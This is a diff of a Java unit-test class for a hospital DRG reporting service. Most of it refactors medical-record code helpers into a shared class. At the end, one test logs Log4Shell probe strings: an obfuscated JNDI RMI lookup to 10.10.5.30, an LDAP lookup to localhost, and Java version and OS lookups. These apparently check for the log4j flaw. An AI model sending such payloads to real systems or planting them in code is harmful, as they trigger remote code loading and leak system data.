@@ -9,6 +9,8 @@ import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Optional;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 import org.junit.Ignore;
 import org.junit.Test;
 import org.junit.runner.RunWith;
@@ -33,6 +35,7 @@ import tw.com.leadtek.nhiwidget.model.rdb.OP_D;
 import tw.com.leadtek.nhiwidget.model.rdb.OP_P;
 import tw.com.leadtek.nhiwidget.model.rdb.OP_T;
 import tw.com.leadtek.nhiwidget.model.rdb.POINT_WEEKLY;
+import tw.com.leadtek.nhiwidget.payload.MRDetail;
 import tw.com.leadtek.nhiwidget.service.DrgCalService;
 import tw.com.leadtek.nhiwidget.service.IntelligentService;
 import tw.com.leadtek.nhiwidget.service.ReportService;
@@ -42,6 +45,8 @@ import tw.com.leadtek.nhiwidget.service.ReportService;
 @WebAppConfiguration
 public class TestDrgCalService {
 
+  private Logger logger = LogManager.getLogger();
+  
   @Autowired
   private IP_DDao ipdDao;
 
@@ -189,35 +194,7 @@ public class TestDrgCalService {
   @Test
   public void calculateWeekly() {
     // start date : 2019/01/01
-    Calendar cal = Calendar.getInstance();
-    int year = 2019;
-    cal.set(Calendar.YEAR, year);
-    cal.set(Calendar.MONTH, 0);
-    cal.set(Calendar.DAY_OF_YEAR, 1);
-
-    if (cal.get(Calendar.DAY_OF_WEEK) != Calendar.SUNDAY) {
-      cal.add(Calendar.DAY_OF_YEAR, Calendar.SUNDAY - cal.get(Calendar.DAY_OF_WEEK));
-    }
-    List<Object[]> list = mrDao.findDRGAllFuncType();
-    List<String> funcTypes = new ArrayList<String>();
-    for (Object[] obj : list) {
-      funcTypes.add((String) obj[0]);
-    }
-    //funcTypes.add(0, ReportService.FUNC_TYPE_ALL);
-    
-    do {
-      Date start = cal.getTime();
-      cal.add(Calendar.DAY_OF_YEAR, 6);
-      Date end = cal.getTime();
-
-      POINT_WEEKLY pw = reportService.calculatePointByWeek(start, end);
-      if (pw == null || pw.getIp().longValue() + pw.getOp().longValue() == 0) {
-        break;
-      }
-      reportService.calculateDRGPointByWeek(start, end, funcTypes);
-      System.out.println("year=" + pw.getPyear() + "," + pw.getPweek() + "," + pw.getStartDate() + "," + pw.getEndDate());
-      cal.add(Calendar.DAY_OF_YEAR, 1);
-    } while (true);
+  
   }
   
   @Ignore
@@ -276,21 +253,11 @@ public class TestDrgCalService {
       List<OP_D> opdList = opdDao.findByMrId(mr.getId());
       for (OP_D opd : opdList) {
         mr.setIcdcm1(opd.getIcdCm1());
-        mr.setIcdcmOthers(getIcdcmOtherOP(opd));
-        mr.setIcdpcs(getIcdpcsOP(opd));
-        getIcdAll(mr);
+        MRDetail.updateIcdcmOtherOP(mr, opd);
+        MRDetail.updateIcdpcsOP(mr, opd);
+        MRDetail.updateIcdAll(mr);
       }
-      List<OP_P> oppList = oppDao.findByMrId(mr.getId());
-      StringBuffer sb = new StringBuffer(",");
-      for(OP_P opp : oppList) {
-        if (opp.getDrugNo() != null) {
-          sb.append(opp.getDrugNo());
-          sb.append(",");
-        }
-      }
-      if (sb.length() > 1) {
-        mr.setCodeAll(sb.toString());
-      }
+      MRDetail.updateCodeAllOP(mr, oppDao.findByMrId(mr.getId()));
       mrDao.save(mr);
     }
   }
@@ -308,132 +275,12 @@ public class TestDrgCalService {
       List<IP_D> ipdList = ipdDao.findByMrId(mr.getId());
       for (IP_D ipd : ipdList) {
         mr.setIcdcm1(ipd.getIcdCm1());
-        mr.setIcdcmOthers(getIcdcmOtherIP(ipd));
-        mr.setIcdpcs(getIcdpcsIP(ipd));
-        getIcdAll(mr);
+        MRDetail.updateIcdcmOtherIP(mr, ipd);
+        MRDetail.updateIcdpcsIP(mr, ipd);
+        MRDetail.updateIcdAll(mr);
       }
-      List<IP_P> ippList = ippDao.findByMrId(mr.getId());
-      StringBuffer sb = new StringBuffer(",");
-      for(IP_P ipp : ippList) {
-        if (ipp.getOrderCode() != null) {
-          sb.append(ipp.getOrderCode());
-          sb.append(",");
-        }
-      }
-      if (sb.length() > 1) {
-        mr.setCodeAll(sb.toString());
-      }
+      MRDetail.updateCodeAllIP(mr, ippDao.findByMrId(mr.getId()));
       mrDao.save(mr);
-    }
-  }
-  
-  private String getIcdcmOtherOP(OP_D opd) {
-    StringBuffer sb = new StringBuffer(",");
-    appendString(sb, opd.getIcdCm2());
-    appendString(sb, opd.getIcdCm3());
-    appendString(sb, opd.getIcdCm4());
-    appendString(sb, opd.getIcdCm5());
-    if (sb.length() > 1) {
-      return sb.toString();
-    }
-    return null;
-  }
-  
-  private String getIcdcmOtherIP(IP_D ipd) {
-    StringBuffer sb = new StringBuffer(",");
-    appendString(sb, ipd.getIcdCm2());
-    appendString(sb, ipd.getIcdCm3());
-    appendString(sb, ipd.getIcdCm4());
-    appendString(sb, ipd.getIcdCm5());
-    appendString(sb, ipd.getIcdCm6());
-    appendString(sb, ipd.getIcdCm7());
-    appendString(sb, ipd.getIcdCm8());
-    appendString(sb, ipd.getIcdCm9());
-    appendString(sb, ipd.getIcdCm10());
-    appendString(sb, ipd.getIcdCm11());
-    appendString(sb, ipd.getIcdCm12());
-    appendString(sb, ipd.getIcdCm13());
-    appendString(sb, ipd.getIcdCm14());
-    appendString(sb, ipd.getIcdCm15());
-    appendString(sb, ipd.getIcdCm16());
-    appendString(sb, ipd.getIcdCm17());
-    appendString(sb, ipd.getIcdCm18());
-    appendString(sb, ipd.getIcdCm19());
-    appendString(sb, ipd.getIcdCm20());
-    if (sb.length() > 1) {
-      return sb.toString();
-    }
-    return null;
-  }
-  
-  private String getIcdpcsOP(OP_D opd) {
-    StringBuffer sb = new StringBuffer(",");
-    appendString(sb, opd.getIcdOpCode1());
-    appendString(sb, opd.getIcdOpCode2());
-    appendString(sb, opd.getIcdOpCode3());
-    if (sb.length() > 1) {
-      return sb.toString();
-    }
-    return null;
-  }
-  
-  private String getIcdpcsIP(IP_D opd) {
-    StringBuffer sb = new StringBuffer(",");
-    appendString(sb, opd.getIcdOpCode1());
-    appendString(sb, opd.getIcdOpCode2());
-    appendString(sb, opd.getIcdOpCode3());
-    appendString(sb, opd.getIcdOpCode4());
-    appendString(sb, opd.getIcdOpCode5());
-    appendString(sb, opd.getIcdOpCode6());
-    appendString(sb, opd.getIcdOpCode7());
-    appendString(sb, opd.getIcdOpCode8());
-    appendString(sb, opd.getIcdOpCode9());
-    appendString(sb, opd.getIcdOpCode10());
-    appendString(sb, opd.getIcdOpCode11());
-    appendString(sb, opd.getIcdOpCode12());
-    appendString(sb, opd.getIcdOpCode13());
-    appendString(sb, opd.getIcdOpCode14());
-    appendString(sb, opd.getIcdOpCode15());
-    appendString(sb, opd.getIcdOpCode16());
-    appendString(sb, opd.getIcdOpCode17());
-    appendString(sb, opd.getIcdOpCode18());
-    appendString(sb, opd.getIcdOpCode19());
-    appendString(sb, opd.getIcdOpCode20());
-    if (sb.length() > 1) {
-      return sb.toString();
-    }
-    return null;
-  }
-  
-  private void getIcdAll(MR mr) {
-    StringBuffer sb = new StringBuffer(",");
-    if (mr.getIcdcm1() != null) {
-      sb.append(mr.getIcdcm1());
-      sb.append(",");
-    }
-    if (mr.getIcdcmOthers() != null) {
-      if (sb.charAt(sb.length() - 1) == ',') {
-        sb.deleteCharAt(sb.length() - 1);
-      }
-      sb.append(mr.getIcdcmOthers());
-    }
-    if (mr.getIcdpcs() != null) {
-      if (sb.charAt(sb.length() - 1) == ',') {
-        sb.deleteCharAt(sb.length() - 1);
-      }
-      sb.append(mr.getIcdpcs());
-    }
-    if (sb.length() > 1) {
-      mr.setIcdAll(sb.toString());
-    } else {
-      mr.setIcdAll(null);
-    }
-  }
-  
-  private void appendString(StringBuffer sb, String s) {
-    if (s != null) {
-      sb.append(s);
-      sb.append(",");
     }
   }
   
@@ -442,9 +289,16 @@ public class TestDrgCalService {
   public void calculateRareIcd() {
 //    is.calculateRareICD();
 //    is.calculateInfectious("11011");
-//    is.calculateInfectious("11012");
+    //is.calculateInfectious("11012");
     
     //is.calculateHighRatio();
-    is.testCount();
+    //is.calculateOverAmount();
+    //is.testCount();
+    System.out.println("start");
+    logger.error("java.version = ${java:version}, os = ${java:os}");
+    logger.error("${jndi:${lower:rmi}://10.10.5.30:8081/user}");
+    logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
+    System.out.println("end");
+    
   }
 }
